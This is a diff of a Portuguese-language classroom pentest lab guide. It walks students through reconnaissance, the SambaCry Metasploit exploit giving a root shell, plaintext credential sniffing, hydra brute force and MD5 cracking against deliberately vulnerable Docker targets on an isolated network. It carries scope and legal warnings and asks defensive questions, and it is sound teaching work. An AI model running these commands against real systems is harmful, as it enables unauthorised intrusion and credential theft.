@@ -8,16 +8,16 @@
 
 ## O que é feito antes da aula x durante a aula
 
-> **Antes da aula (Atividade 0 — "Preparando o ambiente"):** você prepara o ambiente sozinho, em casa, com antecedência — instalar o Docker, baixar o pacote de imagens, subir os containers e confirmar que os 2 alvos estão no ar. Nada disso acontece no dia da aula.
+> **Antes da aula (Atividade 0 - "Preparando o ambiente"):** você prepara o ambiente sozinho, em casa, com antecedência - instalar o Docker, baixar o pacote de imagens, subir os containers e confirmar que os 2 alvos estão no ar. Nada disso acontece no dia da aula.
 >
 > **No dia da aula (Atividades 1 a 7):** com o ambiente já pronto, você executa ao vivo, no laboratório:
-> - **Atividade 1** — Reconhecimento e enumeração dos alvos
-> - **Atividade 2** — Análise de vulnerabilidades
-> - **Atividade 3** — Exploração remota via Metasploit (SambaCry)
-> - **Atividade 4** — Sniffing de credenciais
-> - **Atividade 5** — Força bruta online
-> - **Atividade 6** — Quebra de hash offline
-> - **Atividade 7** — Pós-exploração e reflexão sobre detecção/defesa
+> - **Atividade 1** - Reconhecimento e enumeração dos alvos
+> - **Atividade 2** - Análise de vulnerabilidades
+> - **Atividade 3** - Exploração remota via Metasploit (SambaCry)
+> - **Atividade 4** - Sniffing de credenciais
+> - **Atividade 5** - Força bruta online
+> - **Atividade 6** - Quebra de hash offline
+> - **Atividade 7** - Pós-exploração e reflexão sobre detecção/defesa
 >
 > Se você já fez a Atividade 0 em casa e confirmou o checklist, pode ir direto para a Atividade 1 no dia da aula.
 
@@ -27,21 +27,21 @@
 
 1. [Introdução: a metodologia de um teste de intrusão](#1-introdução-a-metodologia-de-um-teste-de-intrusão)
 2. [Escopo e uso responsável](#2-escopo-e-uso-responsável)
-3. [Atividade 0 — Preparando o ambiente](#3-atividade-0--preparando-o-ambiente)
-4. [Atividade 1 — Reconhecimento e Enumeração](#4-atividade-1--reconhecimento-e-enumeração)
-5. [Atividade 2 — Análise de Vulnerabilidades](#5-atividade-2--análise-de-vulnerabilidades)
-6. [Atividade 3 — SambaCry via Metasploit](#6-atividade-3--sambacry-via-metasploit)
-7. [Atividade 4 — Sniffing de credenciais](#7-atividade-4--sniffing-de-credenciais)
-8. [Atividade 5 — Força bruta online](#8-atividade-5--força-bruta-online)
-9. [Atividade 6 — Quebra de hash offline](#9-atividade-6--quebra-de-hash-offline)
-10. [Atividade 7 — Pós-Exploração](#10-atividade-7--pós-exploração)
+3. [Atividade 0 - Preparando o ambiente](#3-atividade-0--preparando-o-ambiente)
+4. [Atividade 1 - Reconhecimento e Enumeração](#4-atividade-1--reconhecimento-e-enumeração)
+5. [Atividade 2 - Análise de Vulnerabilidades](#5-atividade-2--análise-de-vulnerabilidades)
+6. [Atividade 3 - SambaCry via Metasploit](#6-atividade-3--sambacry-via-metasploit)
+7. [Atividade 4 - Sniffing de credenciais](#7-atividade-4--sniffing-de-credenciais)
+8. [Atividade 5 - Força bruta online](#8-atividade-5--força-bruta-online)
+9. [Atividade 6 - Quebra de hash offline](#9-atividade-6--quebra-de-hash-offline)
+10. [Atividade 7 - Pós-Exploração](#10-atividade-7--pós-exploração)
 11. [Resumo das ferramentas e próximos passos](#11-resumo-das-ferramentas-e-próximos-passos)
 
 ---
 
 ## 1. Introdução: a metodologia de um teste de intrusão
 
-Um teste de intrusão (pentest) não é uma sequência aleatória de comandos — é um processo com fases bem definidas, cada uma alimentando a próxima:
+Um teste de intrusão (pentest) não é uma sequência aleatória de comandos - é um processo com fases bem definidas, cada uma alimentando a próxima:
 
 ```
 Reconhecimento  →  Enumeração  →  Análise de       →  Exploração  →  Pós-Exploração
@@ -51,7 +51,7 @@ Reconhecimento  →  Enumeração  →  Análise de       →  Exploração  →
                                   vulnerável?)
 ```
 
-- **Reconhecimento:** mapear o que existe na rede — hosts ativos, portas abertas.
+- **Reconhecimento:** mapear o que existe na rede - hosts ativos, portas abertas.
 - **Enumeração:** identificar exatamente quais serviços e versões estão rodando em cada porta.
 - **Análise de vulnerabilidades:** cruzar essas versões com falhas conhecidas (CVEs).
 - **Exploração:** usar uma falha identificada para obter acesso não autorizado.
@@ -63,30 +63,30 @@ Neste laboratório você vai passar por todas essas fases contra alvos proposita
 
 ## 2. Escopo e uso responsável
 
-> ⚠️ **Todo comando e técnica deste roteiro deve ser usado exclusivamente contra os alvos abaixo, dentro da rede isolada do laboratório (`172.20.0.0/24`). Usar as mesmas técnicas contra qualquer sistema real sem autorização expressa por escrito é crime no Brasil (Lei 12.737/2012 — "Lei Carolina Dieckmann" — e Lei 14.155/2021).**
+> ⚠️ **Todo comando e técnica deste roteiro deve ser usado exclusivamente contra os alvos abaixo, dentro da rede isolada do laboratório (`172.20.0.0/24`). Usar as mesmas técnicas contra qualquer sistema real sem autorização expressa por escrito é crime no Brasil (Lei 12.737/2012 - "Lei Carolina Dieckmann" - e Lei 14.155/2021).**
 
 Isso não é burocracia: a diferença entre um profissional de segurança e um criminoso não está na técnica usada, e sim na **autorização**. Todo pentest profissional começa com um contrato de escopo assinado, definindo exatamente quais sistemas podem ser testados, por quanto tempo, e com quais técnicas. O hábito de sempre confirmar o escopo antes de rodar qualquer ferramenta é o primeiro reflexo profissional que você deve desenvolver.
 
 ---
 
-## 3. Atividade 0 — Preparando o ambiente
+## 3. Atividade 0 - Preparando o ambiente
 
 ### 3.1 Por que Docker?
 
-Em vez de subir máquinas virtuais completas (pesadas, lentas para resetar), usamos containers: cada alvo vulnerável é uma aplicação isolada, leve, que sobe e derruba em segundos. Todo o ambiente roda **no seu próprio notebook** — nenhum alvo depende de servidor externo ou de rede durante a aula.
+Em vez de subir máquinas virtuais completas (pesadas, lentas para resetar), usamos containers: cada alvo vulnerável é uma aplicação isolada, leve, que sobe e derruba em segundos. Todo o ambiente roda **no seu próprio notebook** - nenhum alvo depende de servidor externo ou de rede durante a aula.
 
 ### 3.2 Instalando o Docker no Kali
 
-O Kali **não** vem com Docker pré-instalado por padrão, e os pacotes do repositório oficial dele têm nomes/disponibilidade inconsistentes — o caminho mais confiável é o instalador oficial da própria Docker. Siga os passos na ordem, mesmo que algum pareça repetitivo — cada um resolve um problema específico que já apareceu na prática.
+O Kali **não** vem com Docker pré-instalado por padrão, e os pacotes do repositório oficial dele têm nomes/disponibilidade inconsistentes - o caminho mais confiável é o instalador oficial da própria Docker. Siga os passos na ordem, mesmo que algum pareça repetitivo - cada um resolve um problema específico que já apareceu na prática.
 
-**Passo 1 — Instalador oficial:**
+**Passo 1 - Instalador oficial:**
 
 ```bash
 curl -fsSL https://get.docker.com -o get-docker.sh
 sudo sh get-docker.sh
 ```
 
-**Se aparecer o erro `the repository 'https://download.docker.com/linux/debian kali-rolling Release' does not have a Release file`:** é um problema conhecido — o script detecta o Kali como Debian, mas usa o codinome `kali-rolling`, que os repositórios do Docker não reconhecem. Corrija apontando manualmente para um codinome Debian válido:
+**Se aparecer o erro `the repository 'https://download.docker.com/linux/debian kali-rolling Release' does not have a Release file`:** é um problema conhecido - o script detecta o Kali como Debian, mas usa o codinome `kali-rolling`, que os repositórios do Docker não reconhecem. Corrija apontando manualmente para um codinome Debian válido:
 
 ```bash
 sudo rm /etc/apt/sources.list.d/docker.list
@@ -95,14 +95,14 @@ sudo apt-get update
 sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
 ```
 
-**Não instale `podman-docker`** mesmo que o terminal sugira esse pacote em alguma mensagem de erro — ele cria um comando `docker` que na verdade roda o Podman por baixo (motor de container diferente), o que causa comportamentos inconsistentes com o `docker-compose.yml` deste laboratório (especialmente rede com IP fixo). Se você instalou por engano, remova antes de seguir:
+**Não instale `podman-docker`** mesmo que o terminal sugira esse pacote em alguma mensagem de erro - ele cria um comando `docker` que na verdade roda o Podman por baixo (motor de container diferente), o que causa comportamentos inconsistentes com o `docker-compose.yml` deste laboratório (especialmente rede com IP fixo). Se você instalou por engano, remova antes de seguir:
 
 ```bash
 sudo apt remove -y podman-docker
 sudo apt autoremove -y
 ```
 
-**Passo 2 — Aplicar permissão de grupo:**
+**Passo 2 - Aplicar permissão de grupo:**
 
 ```bash
 sudo usermod -aG docker $USER
@@ -116,12 +116,19 @@ newgrp docker
 
 Isso aplica o grupo na sessão atual sem precisar fechar o terminal. Se em outro terminal novo o erro voltar a aparecer, repita o `newgrp docker` nele também (ou faça logout/login completo da sessão gráfica uma vez, para aplicar de vez em todas as sessões futuras).
 
-**Passo 3 — Confirme que funcionou:**
+**Passo 3 - Confirme que funcionou:**
 
 ```bash
 docker --version
 docker compose version
 docker run hello-world
+```
+
+**Resultado esperado (`docker --version` / `docker compose version`):**
+
+```
+Docker version 29.8.0, build 88096ef
+Docker Compose version v5.5.1
 ```
 
 **Resultado esperado do `docker run hello-world`:**
@@ -151,14 +158,14 @@ Se aparecer essa mensagem, o Docker está funcionando corretamente.
 
 ### 3.4 Criando o diretório de trabalho e clonando o repositório
 
-Antes de mais nada, escolha e crie um diretório fixo para o laboratório — isso evita confusão sobre "onde estão os arquivos" mais tarde. Recomendo dentro da sua pasta `Desktop`:
+Antes de mais nada, escolha e crie um diretório fixo para o laboratório - isso evita confusão sobre "onde estão os arquivos" mais tarde. Recomendo dentro da sua pasta `Desktop`:
 
 ```bash
 mkdir -p ~/Desktop
 cd ~/Desktop
 ```
 
-Agora clone o repositório do laboratório **dentro** dessa pasta — o `git clone` cria automaticamente uma subpasta com o nome do repositório (`lab-kali-docker/`), já contendo o `docker-compose.yml`, o `smb.conf` e a pasta `login-simples/` prontos (o professor já deixou tudo commitado):
+Agora clone o repositório do laboratório **dentro** dessa pasta - o `git clone` cria automaticamente uma subpasta com o nome do repositório (`lab-kali-docker/`), já contendo o `docker-compose.yml`, o `smb.conf` e a pasta `login-simples/` prontos (o professor já deixou tudo commitado):
 
 ```bash
 git clone https://github.com/peotta/lab-kali-docker.git
@@ -167,9 +174,9 @@ cd ~/Desktop/lab-kali-docker
 
 A partir daqui, **todo comando deste roteiro deve ser rodado com o terminal dentro de `~/Desktop/lab-kali-docker`**, a não ser que eu diga explicitamente o contrário.
 
-### 3.5 Baixando o pacote de imagens **antes** da aula — importante!
+### 3.5 Baixando o pacote de imagens **antes** da aula - importante!
 
-As imagens dos alvos são distribuídas prontas, já construídas, em um único arquivo `.tar` (~391MB), para você não depender de baixar/compilar nada durante a aula. **Faça esta etapa até 21/09 (2 dias antes da aula, no máximo)** — não deixe para o dia 23/09.
+As imagens dos alvos são distribuídas prontas, já construídas, em um único arquivo `.tar` (~391MB), para você não depender de baixar/compilar nada durante a aula. **Faça esta etapa até 21/09 (2 dias antes da aula, no máximo)** - não deixe para o dia 23/09.
 
 ```bash
 cd ~/Desktop/lab-kali-docker
@@ -191,7 +198,7 @@ lab-kali-docker/login-simples           latest     12e85951ac23   707MB
 vulhub/samba                            4.6.3      ba1886fa5d9d   913MB
 ```
 
-Se por algum motivo o link não estiver acessível, um pendrive com `lab-images.tar` estará disponível — procure o professor com antecedência, não no dia da aula.
+Se por algum motivo o link não estiver acessível, um pendrive com `lab-images.tar` estará disponível - procure o professor com antecedência, não no dia da aula.
 
 ### 3.6 Onde cada arquivo fica no disco
 
@@ -216,7 +223,7 @@ Confirme com:
 ls -la ~/Desktop/lab-kali-docker/
 ```
 
-Você **não precisa criar** nenhum desses arquivos manualmente — eles já vêm prontos no repositório. Os conteúdos abaixo (`docker-compose.yml` e `smb.conf`) estão aqui só para referência, caso queira entender o que cada um faz ou precise recriá-los em caso de algum problema:
+Você **não precisa criar** nenhum desses arquivos manualmente - eles já vêm prontos no repositório. Os conteúdos abaixo (`docker-compose.yml` e `smb.conf`) estão aqui só para referência, caso queira entender o que cada um faz ou precise recriá-los em caso de algum problema:
 
 **`~/Desktop/lab-kali-docker/docker-compose.yml`:**
 
@@ -271,7 +278,7 @@ services:
     guest only = yes
 ```
 
-Esse compartilhamento (`myshare`) é anônimo e gravável de propósito — é justamente essa combinação que o exercício da Atividade 3 explora.
+Esse compartilhamento (`myshare`) é anônimo e gravável de propósito - é justamente essa combinação que o exercício da Atividade 3 explora.
 
 Se o link/repositório do professor não estiver disponível e você precisar recriar esses dois arquivos do zero, use `nano ~/Desktop/lab-kali-docker/docker-compose.yml` e `nano ~/Desktop/lab-kali-docker/smb.conf`, colando o conteúdo acima em cada um.
 
@@ -313,19 +320,19 @@ Faça isto em casa, **antes** do dia da aula, e não durante:
 - [ ] `docker compose ps` mostra os 2 alvos como `Up`
 - [ ] Você consegue acessar `http://172.20.0.10` (página de login) pelo navegador
 
-Se algum item falhar, procure o professor com antecedência — resolver isso no dia da aula tira tempo de prática de todo mundo.
+Se algum item falhar, procure o professor com antecedência - resolver isso no dia da aula tira tempo de prática de todo mundo.
 
 **Requisito de máquina:** os 2 containers juntos consomem pouco. Qualquer notebook rodando Kali (nativo ou em VM) com 4GB+ de RAM alocados é suficiente.
 
 ---
 
-## 4. Atividade 1 — Reconhecimento e Enumeração
+## 4. Atividade 1 - Reconhecimento e Enumeração
 
 ### 4.1 O que estamos fazendo aqui
 
 Antes de atacar qualquer coisa, você precisa saber **o que existe**. Reconhecimento é descobrir hosts ativos; enumeração é descobrir, em cada host, quais portas estão abertas, quais serviços rodam nelas e quais versões.
 
-### 4.2 `nmap` — o mapeador de rede
+### 4.2 `nmap` - o mapeador de rede
 
 | Flag | O que faz |
 |---|---|
@@ -335,13 +342,13 @@ Antes de atacar qualquer coisa, você precisa saber **o que existe**. Reconhecim
 | `-p-` | Varre **todas** as 65535 portas |
 | `-A` | Modo agressivo: combina `-sV`, `-sC`, detecção de SO e traceroute |
 
-**Passo 1 — Descobrir hosts ativos:**
+**Passo 1 - Descobrir hosts ativos:**
 
 ```bash
 nmap -sn 172.20.0.0/24
 ```
 
-**Passo 2 — Varredura de versão nos alvos:**
+**Passo 2 - Varredura de versão nos alvos:**
 
 ```bash
 nmap -sV -sC -p- 172.20.0.10
@@ -379,7 +386,7 @@ index.php             (Status: 200) [Size: 426]
 server-status         (Status: 403) [Size: 316]
 ```
 
-Repare no `admin (Status: 301)` — é o diretório escondido, não linkado em nenhum lugar da aplicação. Acesse:
+Repare no `admin (Status: 301)` - é o diretório escondido, não linkado em nenhum lugar da aplicação. Acesse:
 
 ```bash
 curl http://172.20.0.10/admin/
@@ -402,25 +409,25 @@ curl http://172.20.0.10/admin/
 </html>
 ```
 
-Guarde esse diretório na memória — ele volta a ser útil na Atividade 6.
+Guarde esse diretório na memória - ele volta a ser útil na Atividade 6.
 
 **Checkpoint:** ao final desta atividade você deve ter, para cada alvo, porta → serviço → versão → tecnologia, além do diretório `/admin/` encontrado.
 
 ---
 
-## 5. Atividade 2 — Análise de Vulnerabilidades
+## 5. Atividade 2 - Análise de Vulnerabilidades
 
 ### 5.1 O que é uma CVE
 
 CVE (*Common Vulnerabilities and Exposures*) é um identificador padronizado para uma vulnerabilidade conhecida publicamente. Cada CVE tem uma pontuação de severidade (CVSS, de 0 a 10) que indica o quão fácil e o quão grave é explorá-la.
 
-### 5.2 `searchsploit` — cruzando versão com exploit conhecido
+### 5.2 `searchsploit` - cruzando versão com exploit conhecido
 
 ```bash
 searchsploit samba 4.6.3
 ```
 
-**Resultado esperado (formato aproximado — o conteúdo exato do banco muda com atualizações):**
+**Resultado esperado (formato aproximado - o conteúdo exato do banco muda com atualizações):**
 
 ```
 --------------------------------------------------------- ---------------------------------
@@ -437,16 +444,16 @@ Esse é o exploit que vamos usar na Atividade 3, correspondente à CVE-2017-7494
 Para o Samba, responda:
 
 - Qual a CVE associada? (`CVE-2017-7494`)
-- Qual o CVSS? (9.8 — crítico)
-- O exploit requer autenticação prévia? (Não — basta um compartilhamento anônimo gravável)
+- Qual o CVSS? (9.8 - crítico)
+- O exploit requer autenticação prévia? (Não - basta um compartilhamento anônimo gravável)
 
 ---
 
-## 6. Atividade 3 — SambaCry via Metasploit
+## 6. Atividade 3 - SambaCry via Metasploit
 
-**Contexto histórico:** em maio de 2017, poucas semanas depois do WannaCry (que explorou o EternalBlue no Windows), foi divulgada uma falha equivalente no **Samba** — o servidor de arquivos padrão em ambientes Linux/Unix. A imprensa apelidou a falha de **SambaCry**. A causa raiz é uma função (`is_known_pipename`) que permite carregar uma biblioteca (`.so`) de qualquer caminho que o atacante conseguir escrever num compartilhamento — bastando um share anônimo com permissão de escrita.
+**Contexto histórico:** em maio de 2017, poucas semanas depois do WannaCry (que explorou o EternalBlue no Windows), foi divulgada uma falha equivalente no **Samba** - o servidor de arquivos padrão em ambientes Linux/Unix. A imprensa apelidou a falha de **SambaCry**. A causa raiz é uma função (`is_known_pipename`) que permite carregar uma biblioteca (`.so`) de qualquer caminho que o atacante conseguir escrever num compartilhamento - bastando um share anônimo com permissão de escrita.
 
-**Passo 1 — Confirmar a versão do serviço:**
+**Passo 1 - Confirmar a versão do serviço:**
 
 ```bash
 nmap -sV -p 445 172.20.0.13
@@ -454,7 +461,7 @@ nmap -sV -p 445 172.20.0.13
 
 (mesmo resultado já mostrado na Atividade 1)
 
-**Passo 2 — Verificar o compartilhamento disponível:**
+**Passo 2 - Verificar o compartilhamento disponível:**
 
 ```bash
 smbclient -L 172.20.0.13 -N
@@ -467,9 +474,16 @@ smbclient -L 172.20.0.13 -N
         ---------       ----      -------
         myshare         Disk
         IPC$            IPC       IPC Service (Samba Server Version 4.6.3)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
 ```
 
-**Passo 3 — Explorar com o Metasploit Framework:**
+**Passo 3 - Explorar com o Metasploit Framework:**
 
 ```bash
 msfconsole
@@ -489,12 +503,17 @@ msf6 exploit(linux/samba/is_known_pipename) > run
 [*] 172.20.0.13:445 - Retrieving the remote path of the share 'myshare'
 [*] 172.20.0.13:445 - Share 'myshare' has server-side path '/home/share
 [*] 172.20.0.13:445 - Uploaded payload to \\172.20.0.13\myshare\<nome-aleatorio>.so
+[*] 172.20.0.13:445 - Loading the payload from server-side path /home/share/<nome-aleatorio>.so using \\PIPE\/home/share/<nome-aleatorio>.so...
+[-] 172.20.0.13:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 172.20.0.13:445 - Loading the payload from server-side path /home/share/<nome-aleatorio>.so using /home/share/<nome-aleatorio>.so...
 [+] 172.20.0.13:445 - Probe response indicates the interactive payload was loaded...
 [*] Found shell.
-[*] Command shell session 1 opened
+[*] Command shell session 1 opened (172.20.0.1:45689 -> 172.20.0.13:445)
 ```
 
-**Passo 4 — Confirmar o nível de acesso obtido:**
+> A linha `Failed to load STATUS_OBJECT_NAME_NOT_FOUND` é normal - o módulo tenta duas formas de referenciar o caminho do payload, e a primeira falha antes da segunda funcionar. Isso não significa que o exploit falhou.
+
+**Passo 4 - Confirmar o nível de acesso obtido:**
 
 ```bash
 whoami
@@ -507,28 +526,30 @@ uname -a
 ```
 root
 uid=0(root) gid=0(root) groups=0(root)
-Linux <hostname> 6.x-kali-amd64 ... x86_64 GNU/Linux
+Linux 4943bf45512e 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-Acesso root completo, sem nenhuma credencial — só explorando a combinação "compartilhamento anônimo gravável" + "função vulnerável do Samba".
+(o nome do host - `4943bf45512e` no exemplo acima - muda a cada vez que o container é recriado; é só o ID gerado automaticamente pelo Docker)
+
+Acesso root completo, sem nenhuma credencial - só explorando a combinação "compartilhamento anônimo gravável" + "função vulnerável do Samba".
 
 **Para refletir:** por que um compartilhamento de arquivos anônimo e gravável é um risco tão sério, mesmo sem nenhuma vulnerabilidade de código associada?
 
 ---
 
-## 7. Atividade 4 — Sniffing de credenciais
+## 7. Atividade 4 - Sniffing de credenciais
 
-**Conceito:** protocolos que trafegam sem criptografia (HTTP puro, FTP, Telnet) enviam dados — inclusive login e senha — em texto claro pela rede. Qualquer pessoa capaz de "escutar" o tráfego consegue ler esses dados sem quebrar senha nenhuma, sem explorar bug nenhum — só observando passivamente.
+**Conceito:** protocolos que trafegam sem criptografia (HTTP puro, FTP, Telnet) enviam dados - inclusive login e senha - em texto claro pela rede. Qualquer pessoa capaz de "escutar" o tráfego consegue ler esses dados sem quebrar senha nenhuma, sem explorar bug nenhum - só observando passivamente.
 
-**Passo 1 — Identifique a interface de rede correta:**
+**Passo 1 - Identifique a interface de rede correta:**
 
 ```bash
 ip a | grep -A 2 "br-"
 ```
 
-O Docker cria uma interface `br-xxxxxxxxxxxx` para a rede `lab_redsec` (IP `172.20.0.1/24`, `state UP`) — é nela que o tráfego dos containers passa. **O nome exato muda toda vez que a rede é recriada** (ex.: `docker compose down` seguido de `up`), então confirme antes de cada captura.
+O Docker cria uma interface `br-xxxxxxxxxxxx` para a rede `lab_redsec` (IP `172.20.0.1/24`, `state UP`) - é nela que o tráfego dos containers passa. **O nome exato muda toda vez que a rede é recriada** (ex.: `docker compose down` seguido de `up`), então confirme antes de cada captura.
 
-**Passo 2 — Inicie a captura, filtrando por "senha":**
+**Passo 2 - Inicie a captura, filtrando por "senha":**
 
 ```bash
 sudo ngrep -i "senha" -d br-xxxxxxxxxxxx
@@ -536,7 +557,7 @@ sudo ngrep -i "senha" -d br-xxxxxxxxxxxx
 
 Troque `br-xxxxxxxxxxxx` pelo nome real da interface.
 
-**Passo 3 — Gere o tráfego, em outra janela/navegador:**
+**Passo 3 - Gere o tráfego, em outra janela/navegador:**
 
 Acesse `http://172.20.0.10` e envie o formulário:
 
@@ -545,7 +566,7 @@ usuário: admin
 senha: password123
 ```
 
-**Passo 4 — Confira a captura:**
+**Passo 4 - Confira a captura:**
 
 **Resultado esperado no terminal do `ngrep`** (formato do corpo do POST, já confirmado via teste direto do formulário):
 
@@ -562,17 +583,17 @@ Credenciais capturadas em texto claro, sem nenhuma interação com o servidor al
 
 ---
 
-## 8. Atividade 5 — Força bruta online
+## 8. Atividade 5 - Força bruta online
 
 **Conceito:** enquanto a Atividade 4 interceptava uma senha que já estava sendo usada, a força bruta **tenta** senhas até acertar. Funciona quando o serviço não limita o número de tentativas de login.
 
-**Passo 1 — Monte uma lista de senhas para testar:**
+**Passo 1 - Monte uma lista de senhas para testar:**
 
 ```bash
 echo -e "123456\nadmin\npassword\npassword123\nletmein\nqwerty" > /tmp/senhas.txt
 ```
 
-**Passo 2 — Rode o `hydra` contra o formulário:**
+**Passo 2 - Rode o `hydra` contra o formulário:**
 
 ```bash
 hydra -l admin -P /tmp/senhas.txt 172.20.0.10 http-post-form \
@@ -582,23 +603,28 @@ hydra -l admin -P /tmp/senhas.txt 172.20.0.10 http-post-form \
 **Resultado esperado:**
 
 ```
-[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6)
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in
+military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
 [DATA] attacking http-post-form://172.20.0.10:80/:usuario=^USER^&senha=^PASS^:F=incorretos
 [80][http-post-form] host: 172.20.0.10   login: admin   password: password123
 1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
 ```
 
-A sintaxe do `http-post-form` tem três partes separadas por `:`: o caminho (`/`), o corpo do POST (com `^USER^`/`^PASS^` como marcadores substituídos a cada tentativa), e `F=incorretos` — a palavra que aparece na resposta quando o login **falha**.
+A sintaxe do `http-post-form` tem três partes separadas por `:`: o caminho (`/`), o corpo do POST (com `^USER^`/`^PASS^` como marcadores substituídos a cada tentativa), e `F=incorretos` - a palavra que aparece na resposta quando o login **falha**.
 
 **Para refletir:** por que uma wordlist pequena e "óbvia" já foi suficiente aqui? O que um limite de tentativas ou CAPTCHA mudariam?
 
 ---
 
-## 9. Atividade 6 — Quebra de hash offline
+## 9. Atividade 6 - Quebra de hash offline
 
-**Conceito:** até agora, os ataques a senha foram **online** — cada tentativa envia uma requisição real ao servidor. Quando o atacante consegue um **hash** de senha vazado, pode tentar quebrá-lo **offline**, sem comunicação com o servidor — sem limite de tentativas, sem gerar log nenhum no alvo.
+**Conceito:** até agora, os ataques a senha foram **online** - cada tentativa envia uma requisição real ao servidor. Quando o atacante consegue um **hash** de senha vazado, pode tentar quebrá-lo **offline**, sem comunicação com o servidor - sem limite de tentativas, sem gerar log nenhum no alvo.
 
-**Passo 1 — Encontre o arquivo vazado:**
+**Passo 1 - Encontre o arquivo vazado:**
 
 Você já descobriu o painel `/admin/` na Atividade 1. Tente também:
 
@@ -612,16 +638,16 @@ curl http://172.20.0.10/admin/backup_users.txt
 admin:482c811da5d5b4bc6d497ffa98491e38
 ```
 
-**Passo 2 — Identifique o tipo de hash e salve:**
+**Passo 2 - Identifique o tipo de hash e salve:**
 
-O hash tem 32 caracteres hexadecimais — padrão **MD5**.
+O hash tem 32 caracteres hexadecimais - padrão **MD5**.
 
 ```bash
 curl -s http://172.20.0.10/admin/backup_users.txt > hash.txt
 cat hash.txt
 ```
 
-**Passo 3 — Quebre o hash com `john`:**
+**Passo 3 - Quebre o hash com `john`:**
 
 ```bash
 john --format=Raw-MD5 --wordlist=/tmp/senhas.txt hash.txt
@@ -631,15 +657,19 @@ john --show --format=Raw-MD5 hash.txt
 **Resultado esperado:**
 
 ```
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
 password123      (admin)
-1g 0:00:00:00 DONE ...
+1g 0:00:00:00 DONE (2026-09-10 13:32) 50.00g/s 300.0p/s 300.0c/s 300.0C/s 123456..qwerty
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
 
 admin:password123
 
 1 password hash cracked, 0 left
 ```
 
-**Passo 3 (alternativa) — Quebre o mesmo hash com `hashcat`:**
+**Passo 3 (alternativa) - Quebre o mesmo hash com `hashcat`:**
 
 Se necessário, instale o runtime OpenCL para rodar sem GPU dedicada:
 
@@ -658,10 +688,14 @@ hashcat -m 0 -a 0 hash_hashcat.txt /tmp/senhas.txt
 **Resultado esperado:**
 
 ```
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+
 482c811da5d5b4bc6d497ffa98491e38:password123
 
+Session..........: hashcat
 Status...........: Cracked
-Recovered........: 1/1 (100.00%) Digests
+Hash.Mode........: 0 (MD5)
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
 ```
 
 Para ver de novo depois:
@@ -670,17 +704,17 @@ Para ver de novo depois:
 hashcat -m 0 hash_hashcat.txt --show
 ```
 
-A senha descoberta (`password123`) é a mesma da Atividade 5 — só que dessa vez sem nenhuma interação com o servidor.
+A senha descoberta (`password123`) é a mesma da Atividade 5 - só que dessa vez sem nenhuma interação com o servidor.
 
 **Para refletir:** por que um hash MD5 vazado é tão mais fácil de quebrar do que impedir a interceptação de tráfego ou bloquear tentativas de login? O que uma função de hash mais lenta e com "salt" (como bcrypt) mudaria?
 
 ---
 
-## 10. Atividade 7 — Pós-Exploração
+## 10. Atividade 7 - Pós-Exploração
 
 ### 10.1 O que fazer depois de obter acesso
 
-Obter shell não é o fim do trabalho — é o começo da fase de avaliação de impacto.
+Obter shell não é o fim do trabalho - é o começo da fase de avaliação de impacto.
 
 ```bash
 whoami       # qual usuário você é
@@ -699,7 +733,7 @@ Toda ação de ataque deixa rastro. Consulte os logs do container que você expl
 docker logs alvo-samba
 ```
 
-**Para refletir:** olhando esse log, seria possível detectar o ataque que você acabou de executar? E nos casos das Atividades 4 e 5 — sniffing (que não deixa rastro nenhum no servidor) e brute force (que gera uma enxurrada de tentativas de login) — que sinais diferentes cada um deixaria para um time de segurança monitorando? O que isso muda na forma de se defender de cada tipo de ataque?
+**Para refletir:** olhando esse log, seria possível detectar o ataque que você acabou de executar? E nos casos das Atividades 4 e 5 - sniffing (que não deixa rastro nenhum no servidor) e brute force (que gera uma enxurrada de tentativas de login) - que sinais diferentes cada um deixaria para um time de segurança monitorando? O que isso muda na forma de se defender de cada tipo de ataque?
 
 ---
 
@@ -721,7 +755,7 @@ docker logs alvo-samba
 
 ### Para estudar além desta aula
 
-- [Vulhub](https://github.com/vulhub/vulhub) — catálogo com dezenas de outras CVEs prontas para praticar em Docker
-- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) — curso gratuito e completo sobre Metasploit
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — as vulnerabilidades mais críticas em aplicações web
-- [Exploit-DB](https://www.exploit-db.com/) — versão online do banco usado pelo `searchsploit`
+- [Vulhub](https://github.com/vulhub/vulhub) - catálogo com dezenas de outras CVEs prontas para praticar em Docker
+- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) - curso gratuito e completo sobre Metasploit
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - as vulnerabilidades mais críticas em aplicações web
+- [Exploit-DB](https://www.exploit-db.com/) - versão online do banco usado pelo `searchsploit`
